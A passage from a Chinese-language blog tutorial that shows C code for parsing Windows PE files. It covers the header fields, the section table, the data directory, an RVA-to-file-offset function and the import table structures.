data-num="25"></td><td><pre>	<span class="token comment">//_IMAGE_NT_HEADERS</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	PIMAGE_NT_HEADERS ReadNTHeaders<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	ReadNTHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE标志位：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>Signature<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"运行平台：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>Machine<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImageBase：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token comment">// 区段解析遍历</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Section Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	PIMAGE_SECTION_HEADER ReadSectionHeader <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>ReadNTHeaders<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	PIMAGE_FILE_HEADER pFileHeader <span class="token operator">=</span> <span class="token operator">&amp;</span>ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pFileHeader<span class="token operator">-></span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name(区段名称)：%s\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"VOffset(起始的相对虚拟地址)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"VSize(区段大小)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ROffset(文件偏移)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RSize(文件中的区段大小)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"标记(区段的属性)：%08X\n\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226102347066.png" alt="image-20220226102347066" /></p>
<h1 id="数据目录表结构与地址转换函数"><a class="anchor" href="#数据目录表结构与地址转换函数">#</a> 数据目录表结构与地址转换函数</h1>
<h2 id="数据目录"><a class="anchor" href="#数据目录">#</a> 数据目录</h2>
<p>VS 中查看 <code>_IMAGE_DATA_DIRECTORY</code> ，查看数据目录表结构</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DATA_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   Size<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_DATA_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span>    <span class="token expression"><span class="token number">16</span></span></span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226112153373.png" alt="image-20220226112153373" /></p>
<ul>
<li>
<p>VirtualAddress：虚拟地址，而就是数据目录表的起始位置</p>
</li>
<li>
<p>Size：尺寸</p>
</li>
<li>
<p>VirtualAddress + Size：结束地址</p>
</li>
</ul>
<p>数据目录表存在一定的顺序，在 VS 中通过查看 <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> ，查看数据目录表结构顺序</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226112813147.png" alt="image-20220226112813147" /></p>
<p>通过 PE ditor 打开查看数据目录</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226111903077.png" alt="image-20220226111903077" /></p>
<h2 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 计算数据目录表起始位置到文件头的偏移</span></pre></td></tr><tr><td data-num="2"></td><td><pre>DWORD <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>DWORD dwRva<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>DWORD <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>DWORD dwRva<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">//dwRva 是某个数据目录表的 VirtualAddress</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//buffer 是读取到的 PE 文件缓冲区</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">// 区段表</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_SECTION_HEADER pSection <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>pNt<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token comment">// 判断是否落在了头部当中</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRva <span class="token operator">&lt;</span> pSection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">return</span> dwRva<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token comment">//VirtualAddress：虚拟地址，而就是数据目录表的起始位置</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token comment">//Size：尺寸</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token comment">//VirtualAddress + Size：结束地址</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token comment">// 判断是否落在某个区段内</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pNt<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRva <span class="token operator">>=</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">&amp;&amp;</span> dwRva <span class="token operator">&lt;=</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>			<span class="token comment">//dwRva - pSection [i].VirtualAddress 是数据目录表到区段的起始地址的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="29"></td><td><pre>			<span class="token comment">//pSection [i].PointerToRawData 区段到文件头的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="30"></td><td><pre>			<span class="token keyword">return</span> dwRva <span class="token operator">-</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>			<span class="token comment">// 返回的是数据目录表到文件头的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="导入表结构解析"><a class="anchor" href="#导入表结构解析">#</a> 导入表结构解析</h1>
<p>导入表结构</p>
<ul>
<li><code>_IMAGE_IMPORT_DESCRIPTOR</code></li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD   Characteristics<span class="token punctuation">;</span>            <span class="token comment">// 0 for terminating null import descriptor</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        DWORD   OriginalFirstThunk<span class="token punctuation">;</span>         <span class="token comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span>                  <span class="token comment">// 0 if not bound,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                                            <span class="token comment">// -1 if bound, and real date\time stamp</span></pre></td></tr><tr><td data-num="8"></td><td><pre>                                            <span class="token comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>                                            <span class="token comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD   ForwarderChain<span class="token punctuation">;</span>                 <span class="token comment">// -1 if no forwarders</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD   Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    DWORD   FirstThunk<span class="token punctuation">;</span>                     <span class="token comment">// RVA to IAT (if bound this IAT has actual addresses)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span class="token operator">*</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226115958511.png" alt="image-20220226115958511" /></p>
<ul>
<li>_IMAGE_THUNK_DATA32</li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_THUNK_DATA32</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD ForwarderString<span class="token punctuation">;</span>      <span class="token comment">// PBYTE </span></pre></td></tr><tr><td data-num="4"></td><td><pre>        DWORD Function<span class="token punctuation">;</span>             <span class="token comment">// PDWORD</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        DWORD Ordinal<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        DWORD AddressOfData<span class="token punctuation">;</span>        <span class="token comment">// PIMAGE_IMPORT_BY_NAME</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span> u1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_THUNK_DATA32<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">typedef</span> IMAGE_THUNK_DATA32 <span class="token operator">*</span> PIMAGE_THUNK_DATA32<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226120128235.png" alt="image-20220226120128235" /></p>
<ul>
<li>_IMAGE_IMPORT_BY_NAME</li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_BY_NAME</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    WORD    Hint<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    CHAR   Name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_IMPORT_BY_NAME<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_IMPORT_BY_NAME<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226120404893.png" alt="image-20220226120404893" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码</h2>
<p>PE 编辑器查看导入表</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226123610696.png" alt="image-20220226123610696" /></p>
<h3 id="导入表解析函数代码"><a class="anchor" href="#导入表解析函数代码">#</a> 导入表解析函数代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">// 定位导入表</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_DATA_DIRECTORY pImportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">// 填充结构</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_IMPORT_DESCRIPTOR pImport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLL名称：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"日期时间标志：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ForwarderChain：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>ForwarderChain<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"FirstThunk：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>FirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OriginalFirstThunk：%08X\n\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		pImport <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226123434816.png" alt="image-20220226123434816" /></p>
<h3 id="导入表动态信息库api解析代码"><a class="anchor" href="#导入表动态信息库api解析代码">#</a> 导入表动态信息库 (API) 解析代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位导入表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pImportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_IMPORT_DESCRIPTOR pImport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLL名称：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"日期时间标志：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ForwarderChain：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>ForwarderChain<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"FirstThunk：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>FirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OriginalFirstThunk：%08X\n\n"</span><span class="token punctuation">,</span> pImport<span class="token 